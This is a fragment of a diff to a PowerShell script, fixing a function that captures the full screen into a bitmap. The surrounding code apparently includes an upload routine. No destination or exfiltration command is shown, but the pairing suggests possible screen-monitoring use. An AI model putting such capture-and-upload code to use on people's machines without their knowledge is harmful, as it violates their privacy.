@@ -47,8 +47,9 @@ function Upload-File($path){
 
 function Shot(){
   try{
+    Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
-    $b=[Drawing.Rectangle]::FromLTRB(0,0,[Windows.Forms.SystemInformation]::VirtualScreen.Width,[Windows.Forms.SystemInformation]::VirtualScreen.Height)
+    $b=[System.Drawing.Rectangle]::FromLTRB(0,0,[System.Windows.Forms.SystemInformation]::VirtualScreen.Width,[System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
     $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
     $g=[Drawing.Graphics]::FromImage($bmp)
     $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
